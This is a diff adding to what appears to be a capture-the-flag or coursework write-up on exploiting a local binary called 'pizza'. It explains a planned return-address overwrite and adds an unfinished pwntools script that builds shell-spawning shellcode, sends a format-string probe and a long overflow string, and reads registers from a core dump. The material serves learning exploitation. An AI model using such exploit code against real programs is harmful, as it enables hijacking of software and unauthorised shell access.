@@ -25,6 +25,55 @@
   To my knowledge... The core file is generated when the program fails due to a segmentation fault. The core file conatins information of what was happening at the moment that it failed. This could allow us to get information that we need to find a way to create a buffer overflow to change the return address and control the program by sending the address of our own code. The return address should be below the rbp so I would need to overflow the rbp like displayed.            
 
  ![Screenshot from 2023-05-06 19-18-20](https://user-images.githubusercontent.com/111537927/236654265-6385bdf3-aeea-45f4-98c4-c18d768d1ddc.png)
+ 
+ Here is the code I developed:
+ 
+ ```
+ #!/usr/bin/env python3
+
+from pwn import *
+
+#context.log_level = 'error'
+
+# Executable and Linkable Format
+elf = ELF("./pizza")
+
+context(arch='amd64', os='linux', endian='little', word_size=64)
+
+getname_address = elf.symbols["getname"]
+
+shellcode = asm(shellcraft.amd64.linux.sh())
+
+print(f"Shellcode: {shellcode.hex().upper()}")
+print(len(shellcode))
+
+input1 = b"Cantinflas"
+name = b"%p %p %p %p %p %p"
+num = b"1"
+cred = b"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+victim = process("./pizza")
+
+print(str(victim.recvline()))
+victim.sendline(name)
+print(str(victim.recvline()))
+victim.sendline(num)
+print(str(victim.recvline()))
+victim.sendline(cred)
+print(str(victim.recvline()))
+
+#victim.sendline(payload)
+victim.wait()
+#victim.interactive()
+#core = victim.corefile
+core = Corefile("/var/lib/apport/coredump/core._home_aggie_Downloads_pizza.1000.e7ee7302-ab8a-4577-8e5b-8bf275f2b61a.9224.1995902")
+rsp = core.rsp
+rbp = core.rbp
+rip = core.rip
+
+top_of_stack = core.read(rsp,8)
+top_of_stack_1 = core.read(rsp,8)
+                                                          
+ ```
 
  
  
